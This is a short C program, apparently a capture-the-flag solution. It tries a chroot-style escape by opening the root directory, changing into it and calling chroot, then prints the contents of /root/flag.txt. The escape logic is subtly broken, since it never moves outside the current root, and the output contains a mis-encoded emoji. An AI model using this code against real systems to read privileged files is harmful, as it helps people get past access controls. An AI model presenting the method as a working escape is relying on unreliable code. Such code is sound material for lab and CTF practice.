#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    int fd = open("/", O_RDONLY);
    if (fd == -1) {
        perror("open");
        return 1;
    }

    if (fchdir(fd) == -1) {
        perror("fchdir");
        return 1;
    }

    if (chroot(".") == -1) {
        perror("chroot");
        return 1;
    }

    FILE *f = fopen("/root/flag.txt", "r");
    if (!f) {
        perror("fopen");
        return 1;
    }

    char buf[128];
    if (fgets(buf, sizeof(buf), f)) {
        puts("ðŸŽ‰ Flag:");
        puts(buf);
    } else {
        puts("Erreur de lecture");
    }

    fclose(f);
    return 0;
}
